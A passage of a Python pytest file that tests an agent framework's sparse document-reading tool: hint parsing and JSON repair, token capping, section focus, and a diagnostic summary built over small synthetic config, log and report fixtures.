    assert pack.calc_ready is not None
    assert [table["name"] for table in pack.calc_ready["tables"]] == ["Q1_Expenses", "Budgets"]
    assert pack.calc_ready["tables"][0]["columns"] == ["Employee", "Department", "Amount"]
    assert pack.calc_ready["tables"][1]["columns"] == ["Department", "Q4_Budget"]
    assert "Alice Chen	Engineering	1250" in Path(pack.calc_ready["tables"][0]["tsv_path"]).read_text(encoding="utf-8")
    assert "Engineering	27000" in Path(pack.calc_ready["tables"][1]["tsv_path"]).read_text(encoding="utf-8")
    assert pack.unresolved == []


def test_hintspec_coerces_string_needles():
    hint, errors = HintSpec.from_obj({
        "goal": "overview",
        "needles": "columns, all rows of data",
        "want": "table",
    })

    assert errors == []
    assert hint is not None
    assert hint.needles == ["columns", "all rows of data"]


def test_hintspec_repairs_embedded_slot_json():
    hint, errors = HintSpec.from_obj({
        "goal": "Answer report questions",
        "type_hint": "pdf",
        "slots": [
            {"id": "q1", "question": "How many skills were listed before filtering?", "expected": "number"},
            {
                "id": 'q2", "question": "question": "What is the largest skill category?", "expected": "string"}, '
                      '{"id": "q3", "question": "What date was the registry collected?", "expected": "date"}'
            },
        ],
    })

    assert errors == []
    assert hint is not None
    questions = [slot.question for slot in hint.slots]
    assert "What is the largest skill category?" in questions
    assert "What date was the registry collected?" in questions


def test_hintspec_repairs_slots_embedded_in_other_field():
    hint, errors = HintSpec.from_obj({
        "goal": "Answer report questions",
        "type_hint": (
            'type_hint": "pdf": true, "slots": ['
            '{"id": "q1", "question": "How many skills were listed before filtering?", "expected": "number"}, '
            '{"id": "q2", "question": "What type of API does the gateway expose?", "expected": "API type"}]'
        ),
    })

    assert errors == []
    assert hint is not None
    assert [slot.id for slot in hint.slots] == ["q1", "q2"]


def test_calc_artifact_path_is_not_handed_off(tmp_path):
    calc_path = tmp_path / ".nanobot" / "sro-calc" / "sro_x" / "rows.tsv"
    calc_path.parent.mkdir(parents=True)
    calc_path.write_text("a\tb\n1\t2\n", encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    assert sro.is_calc_artifact(calc_path)
    assert sro.should_handoff_read(calc_path) is False


def test_runner_reduces_max_tokens_when_prompt_nears_context_limit(monkeypatch):
    provider = SimpleNamespace(generation=SimpleNamespace(max_tokens=8192))
    runner = AgentRunner(provider)  # type: ignore[arg-type]
    spec = AgentRunSpec(
        initial_messages=[],
        tools=SimpleNamespace(get_definitions=lambda: []),  # type: ignore[arg-type]
        model="qwen35-local",
        max_iterations=5,
        max_tool_result_chars=4000,
        context_window_tokens=32768,
    )
    messages = [{"role": "user", "content": "x"}]

    monkeypatch.setattr(
        "nanobot.agent.runner.estimate_prompt_tokens_chain",
        lambda provider, model, messages, tools: (32760, None),
    )

    capped = runner._effective_max_tokens(spec, messages, [])
    assert capped == 1


def test_pdf_focus_prefers_quoted_section_names(tmp_path):
    text_path = tmp_path / "report.md"
    text_path.write_text(
        "\n".join(
            [
                "# Overview",
                "General introduction.",
                "",
                "## Proposed tasks",
                "1. Secure skill installation",
                "2. Browser automation",
                "3. Workflow scheduling",
                "",
                "## Other notes",
                "Unrelated details.",
            ]
        ),
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(text_path)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        {
            "goal": "Find the 'Proposed tasks' section and count how many new benchmark tasks are listed there.",
            "want": "count",
            "artifact": card.artifact_id,
            "type_hint": "text",
        },
    )

    assert pack.evidence
    assert "Proposed tasks" in pack.evidence[0].text


def test_sro_card_returns_exact_next_action_for_sparse_artifact(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    path = tmp_path / "report.md"
    path.write_text("x" * 5000, encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    tool = SroCardTool(sro)

    result = json.loads(asyncio.run(tool.execute(str(path))))

    assert result["next_action"]["tool"] == "sro_read"
    assert result["next_action"]["target"] == {"artifact_id": result["file_card"]["artifact_id"]}
    assert result["next_action"]["mode"] == "collect"
    assert "slots" not in result["next_action"]["hint"]


def test_sro_read_normalizes_wrapped_mode_and_string_target(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    path = tmp_path / "report.md"
    path.write_text(
        "The public registry had 5,705 community-built skills.\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(path)
    tool = SroReadTool(sro)

    result = json.loads(asyncio.run(tool.execute(
        target=json.dumps({"artifact_id": card.artifact_id}),
        mode={
            "mode": "collect",
            "hint": {
                "goal": "Answer report facts",
                "slots": [
                    {
                        "id": "total_skills",
                        "question": "How many community-built skills were in the public registry?",
                        "expected": "count",
                    }
                ],
            },
        },
    )))

    digest = result["evidence_pack"]["slot_digest"]
    assert digest["overall_status"] == "ready"
    assert digest["slots"][0]["candidate"] == "5,705"


def test_invalid_collect_slots_returns_retry_next_action(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    path = tmp_path / "report.md"
    path.write_text("The public registry had 5,705 community-built skills.\n", encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(path)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Answer report questions",
            "slots": [
                {
                    "id": "q1",
                    "question": "How many community-built skills were in the public registry?",
                    "expected": "count",
                },
                {"id": "q2"},
            ],
        },
    )

    assert pack.summary == "invalid HintSpec"
    assert pack.next_action is not None
    assert pack.next_action["allowed_next"] == ["retry_sro_read"]
    assert pack.next_action["target"] == {"artifact_id": card.artifact_id}
    assert pack.next_action["accepted_slot_ids"] == ["q1", "q2"]


# --- Diagnostic Ledger Tests ---

def _write_task44_assets(root):
    """Create a minimal task_00044-style diagnostic bundle."""
    (root / "config").mkdir(parents=True)
    (root / "logs").mkdir(parents=True)
    (root / "data").mkdir(parents=True)
    (root / "docs").mkdir(parents=True)
    (root / "reports").mkdir(parents=True)

    (root / "config" / "retrieval_config.yaml").write_text(
        "seed_quota: 10\ncontext_window: 3\nmax_total_results: 50\n"
        "sort_order: 'timestamp_desc'\ndedup_strategy: 'keep_first'\n"
        "scoring_method: 'keyword_match'\nmin_relevance_threshold: 0.3\n"
        "log_dropped_entries: true\nenable_context_expansion: true\n"
        "enable_deduplication: true\n",
        encoding="utf-8",
    )
    (root / "config" / "alternate_config_v2.yaml").write_text(
        "seed_quota: 10\ncontext_window: 0\nmax_total_results: 999\n"
        "sort_order: 'relevance_desc'\n"
        "enable_context_expansion: false\nenable_deduplication: true\n"
        "log_dropped_entries: false\n",
        encoding="utf-8",
    )
    (root / "config" / "scoring_weights.json").write_text(
        '{"scoring_weights":{"keyword_match":0.40,"recency_bias":0.35,'
        '"semantic_similarity":0.20,"frequency":0.05}}',
        encoding="utf-8",
    )
    (root / "logs" / "retrieval_run_20240601.log").write_text(
        "=== STAGE 2: Seed Selection (top-K) ===\n"
        "Seed #5: score=0.689, ts=2023-01-12T06:04:05Z, relevance=0.969\n"
        "Seed #12: score=0.6573, ts=2023-01-30T18:40:34Z, relevance=0.86\n"
        "Seed #34: score=0.7889, ts=2023-03-29T11:23:01Z, relevance=0.95\n"
        "=== STAGE 5: Truncation ===\n"
        "Truncating: dropping 12 oldest entries\n"
        "Seed #5 DROPPED during truncation\n"
        "Seed #12 DROPPED during truncation\n"
        "Seed #34 DROPPED during truncation\n"
        "3 of 10 selected seeds were evicted by timestamp-based truncation\n"
        "Precision (seeds retained/selected): 0.70\n",
        encoding="utf-8",
    )
    (root / "reports" / "precision_analysis.csv").write_text(
        "time_bucket,num_seeds_in_bucket,avg_precision,avg_recall\n"
        "Q1-2023,38,0.31,0.28\nQ2-2023,35,0.42,0.38\n"
        "Q3-2023,33,0.55,0.51\nQ4-2023,32,0.68,0.62\n"
        "Q1-2024,34,0.82,0.78\nQ2-2024,28,0.91,0.88\n",
        encoding="utf-8",
    )
    (root / "data" / "benchmark_results_v2.csv").write_text(
        "test_id,query,precision,recall,f1\n"
        'DOC_ROW,"Benchmark Results v2. Filter applied: timestamp > 2024-01-01 (recent memories only).",,,\n'
        "T01,scaling alerting recent improvements,0.87,0.87,0.87\n",
        encoding="utf-8",
    )
    (root / "docs" / "prior_proposals.md").write_text(
        "# Prior Proposals\n\n"
        "## Proposal 1: Increase max_total_results to 100\n"
        "**Status:** Draft. Pros: Zero code changes.\n"
        "## Proposal 2: Round-Robin Context Slot Allocation\n"
        "**Status:** Draft. Cons: No dedup handling.\n"
        "## Proposal 3: Weight-Based Priority Queue\n"
        "**Status:** Draft. Pros: Elegant solution.\n",
        encoding="utf-8",
    )


def test_diagnostic_ledger_config_diffs(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    _write_task44_assets(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Diagnose memory retrieval system seed eviction root cause",
        "needles": ["eviction", "truncation", "config"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    assert "config: diff:" in text
    assert "context_window" in text
    assert "DIAG compact" in text


def test_diagnostic_ledger_disabled_flags(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    _write_task44_assets(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Diagnose memory retrieval system", "needles": ["eviction", "config"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    # zero flags appear in compact "config:" line
    assert ("zero_flags" in text or "context_window" in text)


def test_diagnostic_ledger_log_events(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    _write_task44_assets(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Diagnose memory retrieval eviction from logs",
        "needles": ["eviction", "truncation", "seed", "DROPPED"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    assert "loss:" in text
    assert "3 of 10" in text


def test_diagnostic_ledger_metric_table(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    _write_task44_assets(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Analyze precision data from reports",
        "needles": ["precision", "Q1-2023", "time_bucket"],
        "want": "table", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    assert "precision:" in text
    assert "Q1-2023" in text and "0.31" in text


def test_diagnostic_ledger_methodology_filter(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    _write_task44_assets(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Evaluate benchmark methodology and filter bias",
        "needles": ["benchmark", "filter", "methodology"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    assert "evaluation:" in text


def test_diagnostic_ledger_proposal_inventory(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    _write_task44_assets(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Review prior proposals for fixing seed eviction",
        "needles": ["proposal", "fix", "seed eviction"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    assert "proposals:" in text
    assert "Proposal 1" in text


def test_diagnostic_ledger_over_10_needles_not_invalid(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    _write_task44_assets(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Comprehensive diagnosis",
        "needles": ["seed","eviction","truncation","config","log","precision","benchmark",
                     "proposal","scoring","weight","recency","context_window","max_total_results"],
        "want": "fact", "type_hint": "collection",
    })
    assert pack.summary != "invalid HintSpec"
    assert pack.evidence


def test_diagnostic_ledger_readiness_ready_for_full_bundle(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    _write_task44_assets(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Diagnose memory retrieval system seed eviction root cause and propose fix",
        "needles": ["eviction", "truncation", "config", "precision"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    assert "DIAG compact" in text
    assert pack.next_action is not None
    assert pack.next_action["overall_status"] == "ready"
    # Sections are stored in orchestrator for detail expansion
    sections = sro._diagnostic_sections.get(card.artifact_id, {})
    assert len(sections) >= 3
def test_diagnostic_ledger_preserves_audit_closure(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    bundle = tmp_path / "audit_bundle"
    (bundle / "config").mkdir(parents=True)
    (bundle / "output").mkdir(parents=True)
    (bundle / "config" / "config.yaml").write_text("output:\n  csv_summary: true\n", encoding="utf-8")
    (bundle / "fetch_state.json").write_text('{"seen_ids":["1","2","3"]}', encoding="utf-8")
    (bundle / "output" / "announcements_2026-02-09.json").write_text(
        '[{"announcementId":"1","secCode":"TEST","important":true,"announcementTitle":"Test"}]', encoding="utf-8")
    (bundle / "run_scheduled_fetch.py").write_text("def save_csv_summary(a,d): pass\n", encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(bundle)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Audit processing state vs output records",
        "needles": ["processed_ids", "csv_summary", "flagged"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    assert "collection_audit_closure" in text


def test_diagnostic_ledger_task44_integration(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    _write_task44_assets(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Diagnose memory retrieval system seed eviction root cause and propose fix",
        "needles": ["eviction", "truncation", "config", "precision", "proposal"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    # Compact view includes key facts from all families
    assert "context_window" in text  # config diff
    assert "3 of 10" in text  # loss/eviction
    assert "Q1-2023" in text and "0.31" in text  # precision trend
    assert "Proposal 1" in text  # proposals
    assert pack.next_action["overall_status"] == "ready"
    assert len(text) < 1200  # fits within tool preview
    # Detail guidance present
def test_diagnostic_ledger_not_fire_on_small_bundle(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "docs").mkdir(parents=True)
    (tmp_path / "config").mkdir()
    (tmp_path / "docs" / "query_requirements.md").write_text("Use SPARQL.\n", encoding="utf-8")
    (tmp_path / "config" / "endpoint_config.yaml").write_text("endpoint: local\n", encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Write SPARQL query for product reviews",
        "needles": ["SPARQL", "iPhone"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    assert "DIAG ready" not in text



def test_task_00012_audit_closure_not_regressed(tmp_path, monkeypatch):
    """Task 00012 audit closure should still work as before."""
    monkeypatch.setenv("SRO_ENABLED", "1")
    bundle = tmp_path / "audit_bundle"
    (bundle / "config").mkdir(parents=True)
    (bundle / "output").mkdir(parents=True)
    (bundle / "config" / "config.yaml").write_text("output:\n  csv_summary: true\n", encoding="utf-8")
    (bundle / "fetch_state.json").write_text('{"seen_ids":["1","2","3"]}', encoding="utf-8")
    (bundle / "output" / "announcements_2026-02-09.json").write_text(
        '[{"announcementId":"1","secCode":"TEST","important":true,"announcementTitle":"Test"}]', encoding="utf-8")
    (bundle / "run_scheduled_fetch.py").write_text("def save_csv_summary(a,d): pass\n", encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(bundle)
    pack = sro.read({"artifact_id": card.artifact_id}, "collect", {
        "goal": "Audit processing state vs output records",
        "needles": ["processed_ids", "csv_summary", "flagged"],
        "want": "fact", "type_hint": "collection",
    })
    text = "\n".join(block.text for block in pack.evidence)
    assert "collection_audit_closure" in text
    assert "collection_diagnostic_ledger" not in text
    assert "DIAG ready" not in text
    assert pack.next_action["overall_status"] == "ready"
